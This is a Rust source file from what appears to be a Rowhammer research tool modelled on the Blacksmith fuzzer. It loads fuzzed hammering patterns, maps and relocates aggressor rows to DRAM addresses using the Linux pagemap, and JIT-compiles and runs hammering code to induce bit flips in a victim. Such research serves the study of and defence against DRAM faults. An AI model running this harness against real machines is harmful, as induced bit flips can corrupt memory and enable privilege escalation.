use crate::hammerer::blacksmith::jitter::{AggressorPtr, CodeJitter, Jitter, Program};
use crate::hammerer::{HammerResult, Hammering};
use crate::memory::mem_configuration::MemConfiguration;
use crate::memory::{BytePointer, ConsecBlocks, DRAMAddr, LinuxPageMap, VirtToPhysResolver};
use crate::util::{GroupBy, PAGE_MASK, PAGE_SIZE, ROW_SIZE};
use crate::victim::{HammerVictim, HammerVictimError};
use anyhow::{Context, Result};
use itertools::Itertools;
use rand::Rng;
use serde::Deserialize;
use serde_with::serde_as;
use std::arch::x86_64::{__rdtscp, _mm_mfence};
use std::fmt::Debug;
use std::hash::Hash;
use std::time::Instant;
use std::{collections::HashMap, fs::File, io::BufReader};

#[derive(Deserialize, Debug, Hash, PartialEq, Eq, Clone, Copy)]
pub struct Aggressor(u64);

#[derive(Deserialize, Debug, Clone)]
struct AggressorAccessPattern {
    //frequency: usize,
    //amplitude: i32,
    //start_offset: usize,
    //aggressors: Vec<Aggressor>,
}

#[derive(Deserialize, Debug, Clone)]
#[allow(dead_code)]
pub struct BitFlip {
    pub dram_addr: DRAMAddr,
    bitmask: u8,
    data: u8,
}

impl BitFlip {
    pub fn new(dram_addr: DRAMAddr, bitmask: u8, data: u8) -> Self {
        BitFlip {
            dram_addr,
            bitmask,
            data,
        }
    }
}

#[serde_as]
#[derive(Deserialize, Debug, Clone)]
pub struct PatternAddressMapper {
    pub id: String,
    pub min_row: usize,
    pub max_row: usize,
    pub bank_no: usize,
    #[serde_as(as = "Vec<(_, _)>")]
    pub aggressor_to_addr: HashMap<Aggressor, DRAMAddr>,
    pub bit_flips: Vec<Vec<BitFlip>>,
    code_jitter: CodeJitter,
}

impl PatternAddressMapper {
    pub fn get_hammering_addresses(
        &self,
        aggressors: &[Aggressor],
        base_msb: AggressorPtr,
        mem_config: MemConfiguration,
    ) -> Vec<AggressorPtr> {
        aggressors
            .iter()
            .map(|agg| self.aggressor_to_addr[agg].to_virt(base_msb, mem_config))
            .collect()
    }

    pub fn aggressor_sets(
        &self,
        mem_config: MemConfiguration,
        block_shift: usize,
    ) -> HashMap<usize, Vec<Aggressor>> {
        // find mapping classes
        let addrs: &HashMap<Aggressor, DRAMAddr> = &self.aggressor_to_addr;

        let addrs_vec = addrs.iter().collect::<Vec<_>>();

        // group aggressors by prefix
        addrs_vec
            .group_by(|(_, addr)| {
                #[allow(clippy::zero_ptr)]
                let virt = addr.to_virt(0 as *const u8, mem_config) as usize;
                virt >> block_shift
            })
            .into_iter()
            .map(|(key, group)| (key, group.into_iter().map(|(aggr, _)| *aggr).collect()))
            .collect()
    }

    pub fn get_bitflips_relocate(
        &self,
        mem_config: MemConfiguration,
        block_shift: usize,
        memory: &ConsecBlocks,
    ) -> Vec<Vec<AggressorPtr>> {
        // TODO this still doesn't quite work...
        let block_size = 1 << block_shift;
        let sets = self.aggressor_sets(mem_config, block_shift);
        let mut base_lookup: HashMap<usize, usize> = HashMap::new();
        for (idx, (base, group)) in sets.iter().enumerate() {
            debug!("Index/Base/Group: {}, {}, {:?}", idx, base, group);
            base_lookup.insert(*base, idx);
        }
        self.bit_flips
            .iter()
            .map(|flips| {
                flips
                    .iter()
                    .map(|flip| {
                        #[allow(clippy::zero_ptr)]
                        let addr = flip.dram_addr.to_virt(0 as *const u8, mem_config) as usize;
                        let prefix = addr >> block_shift;
                        let suffix = addr & (block_size - 1);
                        let base_idx = base_lookup[&prefix];
                        memory.addr(base_idx * block_size + suffix) as *const u8
                    })
                    .collect()
            })
            .collect()
    }

    pub fn get_hammering_addresses_relocate(
        &self,
        aggressors: &[Aggressor],
        mem_config: MemConfiguration,
        block_shift: usize,
        memory: &ConsecBlocks,
    ) -> Result<Vec<AggressorPtr>> {
        info!("Relocating aggressors with shift {}", block_shift);
        let block_size = 1 << block_shift;
        let addrs = &self.aggressor_to_addr;
        let sets = self.aggressor_sets(mem_config, block_shift);

        let mut base_lookup: HashMap<Aggressor, usize> = HashMap::new();
        for (idx, (base, group)) in sets.iter().enumerate() {
            debug!("Index/Base/Group: {}, {}, {:?}", idx, base, group);
            for aggr in group {
                base_lookup.insert(*aggr, idx);
            }
        }
        debug!("{:?}", base_lookup);

        assert_eq!(sets.len() * block_size, memory.len());

        let mut aggrs_relocated = vec![];
        let mut pagemap = LinuxPageMap::new()?;
        for agg in aggressors {
            let base_idx = base_lookup[agg];
            let addr = &addrs[agg];
            #[allow(clippy::zero_ptr)]
            let virt_offset = addr.to_virt(0 as *const u8, mem_config);
            let virt_offset = virt_offset as u64 & ((1 << block_shift) - 1);
            assert!(virt_offset < block_size as u64); // check if virt is within block. This should usually hold, but you never know amirite?
            let base = memory.addr(base_idx * block_size) as u64;
            let relocated = memory.addr(base_idx * block_size + virt_offset as usize) as *const u8;
            let p = pagemap.get_phys(relocated as u64);
            match p {
                Ok(p) => {
                    let phys = DRAMAddr::from_virt(p as *const u8, &mem_config);
                    debug!(
                        "Relocate {:?} to {:?} (0x{:x}), phys {:?} (0x{:x}), base: 0x{:x}, base_idx {}",
                        addr,
                        DRAMAddr::from_virt(relocated, &mem_config),
                        relocated as u64,
                        phys,
                        p,
                        base,
                        base_idx
                    );
                }
                Err(_) => debug!(
                    "Relocate {:?} to {:?} (0x{:x}), base: 0x{:x}, base_idx {}",
                    addr,
                    DRAMAddr::from_virt(relocated, &mem_config),
                    relocated as u64,
                    base,
                    base_idx
                ),
            }
            aggrs_relocated.push(relocated);
        }
        Ok(aggrs_relocated)
    }

    pub fn count_bitflips(&self) -> usize {
        self.bit_flips.iter().map(|b| b.len()).sum()
    }
}

fn get_random_nonaccessed_rows<const S: usize>(
    memory: &dyn BytePointer,
    accessed_rows: &[AggressorPtr],
    mem_config: &MemConfiguration,
    target_bank: usize,
) -> [AggressorPtr; S] {
    let mut addresses: [AggressorPtr; S] = [std::ptr::null_mut(); S];
    let mut rng = rand::thread_rng();
    let mut i = 0;
    // do rejection sampling for nonaccessed rows
    while i < S {
        let candidate = memory.addr(rng.gen_range(0..memory.len()));
        let dram = DRAMAddr::from_virt(candidate as *const u8, mem_config);
        if dram.bank != target_bank {
            continue;
        }
        if accessed_rows.contains(&(candidate as *const u8)) {
            continue;
        }
        addresses[i] = candidate;
        i += 1;
    }
    addresses
}

#[derive(Deserialize, Debug)]
pub struct FuzzSummary {
    pub hammering_patterns: Vec<HammeringPattern>,
}

#[derive(Deserialize, Debug, Clone)]
pub struct HammeringPattern {
    pub id: String,
    //base_period: i32,
    //max_period: usize,
    total_activations: u32,
    num_refresh_intervals: u32,
    //is_location_dependent: bool,
    pub access_ids: Vec<Aggressor>,
    //agg_access_patterns: Vec<AggressorAccessPattern>,
    pub address_mappings: Vec<PatternAddressMapper>,
    //code_jitter: CodeJitter,
}

impl HammeringPattern {
    pub fn load_patterns(json_filename: String) -> Result<Vec<HammeringPattern>> {
        let f = File::open(&json_filename)?;
        let reader = BufReader::new(f);
        let patterns: FuzzSummary = serde_json::from_reader(reader)?;
        Ok(patterns.hammering_patterns)
    }

    /// Load patterns from a file, filtering for given pattern_ids
    pub fn load_pattern_from_json(
        json_filename: String,
        pattern_id: String,
    ) -> Result<HammeringPattern> {
        let f = File::open(&json_filename)?;
        let reader = BufReader::new(f);
        let patterns: FuzzSummary = serde_json::from_reader(reader)?;
        patterns
            .hammering_patterns
            .into_iter()
            .find(|p| pattern_id.eq(&p.id))
            .with_context(|| {
                format!(
                    "did not find pattern with id {} in {}",
                    pattern_id.clone(),
                    json_filename
                )
            })
    }
}

impl HammeringPattern {
    pub fn determine_most_effective_mapping(&self) -> Option<PatternAddressMapper> {
        self.address_mappings
            .iter()
            .max_by_key(|m| m.count_bitflips())
            .cloned()
    }

    pub fn find_mapping(&self, mapping_id: &str) -> Option<PatternAddressMapper> {
        self.address_mappings
            .iter()
            .find(|m| m.id == mapping_id)
            .cloned()
    }
}

pub struct Hammerer<'a> {
    memory: &'a ConsecBlocks,
    hammering_addrs: Vec<AggressorPtr>,
    mem_config: MemConfiguration,
    program: Program,
    attempts: u32,
    check_each_attempt: bool,
    read_pages: Option<Vec<*const u8>>,
}

impl<'a> Hammerer<'a> {
    pub fn new(
        mem_config: MemConfiguration,
        pattern: &HammeringPattern,
        mapping: &PatternAddressMapper,
        block_shift: usize,
        memory: &'a ConsecBlocks, // TODO change to dyn BytePointer after updating hammer_log_cb
        attempts: u32,
        check_each_attempt: bool,
        read_all_pages_except: Option<Vec<*const u8>>,
    ) -> Result<Self> {
        info!("Using pattern {}", pattern.id);
        info!("Using mapping {}", mapping.id);

        let hammer_log_cb = |action: &str, addr: *const u8| {
            let block_idx = memory.blocks.iter().find_position(|base| {
                (addr as u64) >= base.ptr() as u64
                    && (addr as u64) <= (base.addr(base.len() - 1) as u64)
            });
            let found = block_idx.is_some();
            if !found {
                error!("OUT OF BOUNDS ACCESS: {} {:?}", action, addr);
            }
            let paddr = LinuxPageMap::new()
                .expect("pagemap open")
                .get_phys(addr as u64);
            match paddr {
                Ok(paddr) => {
                    let dram = DRAMAddr::from_virt(paddr as *const u8, &mem_config);
                    debug!(
                        "{:>06} {:02},{:04},0x{:02x},{}",
                        action,
                        dram.bank,
                        dram.row,
                        paddr,
                        block_idx.map(|(idx, _)| idx).unwrap_or(usize::MAX)
                    )
                }
                Err(e) => warn!("Failed to get physical address: {}", e),
            };
        };

        let acts_per_tref = pattern.total_activations / pattern.num_refresh_intervals;

        let hammering_addrs = mapping.get_hammering_addresses_relocate(
            &pattern.access_ids,
            mem_config,
            block_shift,
            memory,
        )?;
        let num_accessed_addrs = hammering_addrs
            .iter()
            .map(|x| (*x as usize) & !0xFFF)
            .unique()
            .count();

        info!("Pattern contains {} accessed addresses", num_accessed_addrs);

        let program =
            mapping
                .code_jitter
                .jit(acts_per_tref as u64, &hammering_addrs, &hammer_log_cb)?;
        if cfg!(feature = "jitter_dump") {
            program
                .write("hammer_jit.o")
                .with_context(|| "failed to write function to disk")?;
        }

        if let Some(exceptions) = read_all_pages_except.as_ref() {
            for page in exceptions {
                assert_eq!(
                    (*page as usize & PAGE_MASK),
                    0,
                    "only page-aligned addresses supported"
                );
            }
        }

        let read_pages = match read_all_pages_except {
            None => None,
            Some(exceptions) => {
                let mut rows = vec![];
                assert_eq!(
                    memory.len() % ROW_SIZE,
                    0,
                    "memory size must be multiple of row size"
                );
                assert_eq!(
                    memory.len() % PAGE_SIZE,
                    0,
                    "memory size must be multiple of page size"
                );
                for offset in (0..memory.len()).step_by(PAGE_SIZE) {
                    let page = memory.addr(offset) as *const u8;
                    if !exceptions.contains(&page) {
                        rows.push(page);
                    }
                }
                Some(rows)
            }
        };

        Ok(Hammerer {
            memory,
            hammering_addrs: hammering_addrs.to_vec(),
            program,
            mem_config,
            attempts,
            check_each_attempt,
            read_pages,
        })
    }

    fn do_random_accesses(&self, rows: &[AggressorPtr], wait_until_start_hammering_us: u128) {
        let start = Instant::now();
        while start.elapsed().as_micros() < wait_until_start_hammering_us {
            for row in rows {
                let _ = unsafe { std::ptr::read_volatile(row) };
            }
        }
    }
}

impl<'a> Hammering for Hammerer<'a> {
    fn hammer(&self, victim: &mut dyn HammerVictim) -> Result<HammerResult, HammerVictimError> {
        info!("Hammering with {} attempts", self.attempts);
        let mut rng = rand::thread_rng();
        const REF_INTERVAL_LEN_US: f32 = 7.8; // check if can be derived from pattern?
        victim.init();
        for attempt in 0..self.attempts {
            let wait_until_start_hammering_refs = rng.gen_range(10..128); // range 10..128 is hard-coded in FuzzingParameterSet
            let wait_until_start_hammering_us =
                wait_until_start_hammering_refs as f32 * REF_INTERVAL_LEN_US;
            let target_bank = DRAMAddr::from_virt(self.hammering_addrs[0], &self.mem_config).bank;
            let random_rows = get_random_nonaccessed_rows::<1024>(
                self.memory,
                &self.hammering_addrs,
                &self.mem_config,
                target_bank,
            );
            debug!(
                "do random memory accesses for {} us before running jitted code",
                wait_until_start_hammering_us as u128
            );
            self.do_random_accesses(&random_rows, wait_until_start_hammering_us as u128);
            trace!("call into jitted program");
            unsafe {
                let mut aux = 0;
                _mm_mfence();
                let time = __rdtscp(&mut aux);
                _mm_mfence();
                let result = self.program.call();
                _mm_mfence();
                let time = __rdtscp(&mut aux) - time;
                _mm_mfence();
                debug!("Run {}: JIT call took {} cycles", attempt, time);
                debug!("jit call done: 0x{:02X} (attempt {})", result, attempt);
            }
            if let Some(pages) = &self.read_pages {
                for page in pages {
                    let _ = unsafe { std::ptr::read_volatile(*page as *const [u8; PAGE_SIZE / 8]) };
                }
            }
            if self.check_each_attempt || attempt == self.attempts - 1 {
                let result = victim.check();
                match result {
                    Ok(victim_result) => {
                        info!("Hammering done after {} attempts", attempt);
                        return Ok(HammerResult {
                            attempt,
                            victim_result,
                        });
                    }
                    Err(HammerVictimError::NoFlips) => {}
                    Err(e) => return Err(e),
                }
            }
        }
        info!("Hammering done. No flips found.");
        Err(HammerVictimError::NoFlips)
    }
}
